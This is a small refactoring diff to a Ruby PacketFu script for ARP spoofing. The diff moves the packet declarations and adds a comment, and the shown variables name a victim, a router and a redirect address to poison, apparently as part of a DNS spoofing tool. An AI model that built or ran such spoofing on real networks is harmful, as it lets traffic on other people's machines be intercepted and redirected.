@@ -4,15 +4,16 @@ require 'packetfu'
 require 'thread'
 require './gdns.rb'
 
-$iface = "em1"
-$arp_packet_target = PacketFu::ARPPacket.new()
-$arp_packet_router = PacketFu::ARPPacket.new()
+$iface = "em1"   # interface to send/recieve from
 $sMac = '78:2b:cb:96:ba:de'  # source mac address, eg, address to redirect victim to
 $tMac = '78:2b:cb:a3:db:85'  # target mac address, eg, address to poison
 $rMac = '00:1a:6d:38:15:ff'  # routers mac address
 $sIP = '192.168.0.12'        # source IP address
 $tIP = '192.168.0.11'        # target IP address
 $rIP = '192.168.0.100'       # router IP address
+
+$arp_packet_target = PacketFu::ARPPacket.new()
+$arp_packet_router = PacketFu::ARPPacket.new()
 
 
 def main()
@@ -42,7 +43,6 @@ end
 
 def runSpoof(arp_packet_target,arp_packet_router)
   # Send out both packets
-  iface = "em1"
   caught=false
   while caught==false do
     sleep 1
